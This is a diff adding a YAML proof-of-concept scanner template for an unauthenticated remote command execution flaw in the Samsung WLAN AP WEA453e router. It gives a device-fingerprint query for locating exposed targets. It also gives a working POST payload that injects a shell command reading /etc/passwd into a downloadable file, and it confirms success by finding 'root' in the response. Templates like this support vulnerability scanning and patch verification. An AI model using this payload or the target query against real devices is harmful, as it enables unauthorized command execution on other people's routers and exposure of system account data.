@@ -1,0 +1,21 @@
+name: Samsung WLAN AP wea453e router RCE
+manual: true
+query: app="Chunjs-server" && body="Samsung Electronics"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /(download)/tmp/a.txt
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      body: command1=shell:cat /etc/passwd| dd of=/tmp/a.txt
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: Samsung WLAN AP wea453e router has a remote command execution vulnerability.
+    It can execute arbitrary commands without authorization to obtain server permissions
+  tags: RCE
